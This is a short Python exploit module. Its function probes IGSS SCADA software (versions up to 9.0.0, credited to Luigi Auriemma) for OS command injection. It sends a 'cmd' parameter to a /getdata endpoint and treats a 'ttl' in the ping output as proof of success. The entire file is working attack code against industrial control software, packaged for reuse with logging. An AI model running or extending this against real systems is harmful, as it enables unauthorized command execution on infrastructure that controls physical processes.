import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 1234):
    """
    IGSS ≤ 9.0.0 – Luigi Auriemma
    """
    url = f"http://{target}:{port}/getdata"
    params = {"cmd": "ping -c 1 127.0.0.1"}
    try:
        r = requests.get(url, params=params, timeout=5)
        if "ttl" in r.text:
            logger.info("[+] IGSS command injection succeeded")
            return True
    except Exception as e:
        logger.error(f"IGSS cmdi error: {e}")
    return False